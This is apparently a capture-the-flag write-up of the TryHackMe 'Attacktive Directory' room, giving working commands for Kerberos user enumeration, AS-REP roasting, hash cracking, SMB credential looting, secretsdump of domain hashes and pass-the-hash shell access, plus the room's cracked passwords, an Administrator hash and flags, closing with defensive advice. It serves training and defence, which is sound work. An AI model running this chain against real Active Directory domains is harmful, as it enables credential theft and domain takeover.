# Attacktive Directory — TryHackMe Writeup

> A hands-on Active Directory exploitation lab walk-through  
> Author: Adrian Korwel

---

## Introduction

**Attacktive Directory** is a TryHackMe room designed to teach Active Directory enumeration, Kerberos attacks, and privilege escalation techniques. This write-up documents the entire exploitation chain — from enumeration to full domain compromise — with detailed commands and explanations.

---

## Lab Setup

Before we begin:

- Make sure your **AttackBox** (Kali Linux) and the target **Attacktive Directory** VM are deployed.
- Verify network connectivity with a simple ping or port scan.

```bash
ping 10.10.71.62
```

---

## Tools Used

Ensure these are installed on your attack machine (Kali or Parrot OS):

- nmap — for initial reconnaissance
- enum4linux — SMB enumeration
- kerbrute — Kerberos username enumeration
- impacket — various AD attack tools
- hashcat — password cracking
- smbclient / smbmap — share enumeration
- evil-winrm — interactive shell access with NTLM hash

---


## Step 1: Nmap Port Scan
We start with an aggressive port scan to identify services:
```bash
nmap -A -sC -sV -p- -oN nmap_scan.txt 10.10.71.62
```

Key Services Discovered:
- Kerberos (88/tcp) — Indicates AD/KDC presence
- LDAP (389, 3268) — Lightweight Directory Access Protocol
- SMB (139/445) — File shares, user enumeration
- RDP (3389) — Possible admin access
- HTTP (80) — IIS Web Server

---

## Step 2: SMB Enumeration
We use enum4linux to extract domain-related info:
```bash
enum4linux -a 10.10.71.62
```
Findings:
- Domain Name: THM-AD with another called spookysec.local
- TLD: .local (commonly used in AD environments)
- Visible Users: Some SID cycling reveals users like Administrator, Guest, krbtgt

---

## Step 3: Kerberos Username Enumeration
Modify /etc/hosts to resolve the domain:
```bash
sudo nano /etc/hosts

# Add:
10.10.71.62 spookysec.local
```

Now use kerbrute to enumerate valid usernames:

```bash
kerbrute userenum -d spookysec.local --dc 10.10.71.62 usernames.txt
```
- In most cases you would first use the usernames you have gather from the enum4linux and if that doesn't work use this link and gather usernames to put into your 'usernames.txt', https://github.com/attackdebris/kerberos_enum_userlists
- Valid Users Discovered: administrator, backup, darkstar, james, paradox, robin, svc-admin
- Also save only the valid users to another .txt named valid_users.txt to use for our impacket attack down below
---


## Step 4: AS-REP Roasting
What is AS-REP Roasting?
- Some AD accounts don’t require Kerberos pre-auth. If so, an attacker can request encrypted TGTs and crack them offline.

### Run Impacket's GetNPUsers.py:
```bash
python3 /opt/impacket/examples/GetNPUsers.py \
  -no-pass -dc-ip 10.10.71.62 spookysec.local/valid_users.txt
```
- Output: You’ll receive a Kerberos etype 23 hash for svc-admin.
---

## Step 5: Cracking the AS-REP Hash
Using Hashcat:
```bash
hashcat -m 18200 -a 0 hash.txt passwords.txt --force
```
- Remember to download that password list they gave you from "Task 4" and use it. In real-world you would first use something like rockyou.txt and go from there. 
Result:
The cracked password is:
- management2005

---

## Step 6: SMB Share Access with Valid Creds
With svc-admin:management2005, list accessible shares:
```bash
smbclient -L \\\\10.10.71.62\\ -U svc-admin
```
- Enter password: management2005
- After you find an interesting share you want to get access into: Mount the share and download contents:

```bash
smbclient \\\\10.10.71.62\backup -U svc-admin
get backup_credentials.txt
```
- Decode the base64 content: ```bash echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d ```

### Output: 
```bash backup@spookysec.local:backup2517860 ```

--- 

## Step 7: Privilege Escalation via DRSUAPI
- Use secretsdump.py to extract NTDS.dit hashes:
```bash
python3 /opt/impacket/examples/secretsdump.py \
  -dc-ip 10.10.71.62 backup@spookysec.local:backup2517860
```
- This gives you: Domain user hashes
- One of the most important ones is this one: ```bash Administrator NTLM hash:0e0363213e37b94221497260b0bcb4fc ```

---

## Step 8: Pass-the-Hash to Gain Administrator Shell
- With Evil-WinRM, authenticate using NTLM hash:
```bash
sudo evil-winrm -i 10.10.71.62 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```
- You now have SYSTEM-level access.

---

## Step 9: Capture the Flags
- Search each user desktop for flag.txt or equivalent:
```bash
| User          | Flag                               |
| ------------- | ---------------------------------- |
| Administrator | `TryHackMe{4ctiveD1rectoryM4st3r}` |
| svc-admin     | `TryHackMe{K3rb3r0s_Pr3_4uth}`     |
| backup        | `TryHackMe{B4ckM3UpSc0tty!}`       |
```

---


## Lessons Learned: Key Takeaways from the Lab

### 1. The Power of Configuration Flaws  
- Even minor misconfigurations—like **disabling Kerberos pre-authentication**—can lead to **high-impact attacks** such as AS-REP Roasting.  
- Legacy or service accounts often have weakened settings, making them primary targets.

### 2. Enumeration is the Foundation  
- Proper reconnaissance (e.g., `nmap`, `enum4linux`, `kerbrute`) reveals crucial info: domain structure, user presence, Kerberos services.  
- Tools like `kerbrute` enable stealthy username capture via Kerberos without triggering noisy logs.

### 3. AS-REP Roasting: A Reliable AD Password Extraction Path  
- Targeting pre-auth disabled accounts allows an attacker to **extract encrypted Kerberos TGTs**, which can be cracked offline  
- Utilizing `impacket GetNPUsers.py` automates this process, and tools like `hashcat` (mode 18200) quickly crack weak passwords.

### 4. Credential Reuse via Service Accounts  
- Once we obtained `svc-admin`'s password (`management2005`), we used it to access SMB shares and discovered credentials for a privileged `backup` account.  
- This demonstrates how **one compromised account** can serve as a **gateway to more powerful credentials**.

### 5. DRSUAPI: Wielding Domain-Wide Privilege  
- The `backup` account was improperly synced with `NTDS.dit`, enabling a **DRSUAPI dump** using `secretsdump.py` to extract **all domain hashes**, including `Administrator`
- This method highlights how default AD features can be **leveraged for full domain takeover** when abused.

### 6. Pass-the-Hash to Gain Admin Shell  
- Extracted NTLM hash for `Administrator` allowed us to launch `evil-winrm` with `-H`, granting **SYSTEM-level access** without knowing the plaintext password.  

### 7. Defense and Detection Must Be Proactive  
- **Enable Kerberos pre-authentication on all accounts**, especially legacy ones—even if it breaks legacy apps 
- Enforce **strong password policies and multi-factor authentication**.  
- Monitor Windows Event IDs—**4768 (AS-REQ)** with RC4 (0x17) and no pre-auth flag are indicators of malicious Kerberos activity

--- 















